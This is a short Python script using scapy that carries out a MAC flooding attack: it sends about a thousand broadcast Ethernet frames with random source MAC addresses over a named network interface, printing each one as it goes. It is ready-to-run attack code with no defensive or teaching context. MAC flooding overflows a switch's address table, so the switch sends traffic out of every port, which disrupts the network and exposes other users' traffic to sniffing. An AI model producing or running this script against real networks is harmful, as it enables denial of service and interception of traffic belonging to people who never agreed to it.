from scapy.all import Ether, sendp
import random
import time

def random_mac():
    """Generate a random MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    )

def mac_flood(interface, packet_count=1005, delay=0.01):
    print(f"Starting MAC flooding on interface {interface}...")
    for i in range(packet_count):
        src_mac = random_mac()
        dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC address
        ether_frame = Ether(src=src_mac, dst=dst_mac)
        sendp(ether_frame, iface=interface, verbose=False)
        print(f"Sent packet {i+1} with source MAC {src_mac}")
        time.sleep(delay)
    print("MAC flooding completed.")

if __name__ == "__main__":
    # Replace 'eth0' with your network interface name
    mac_flood(interface="Wi-Fi", packet_count=1005, delay=0.005)
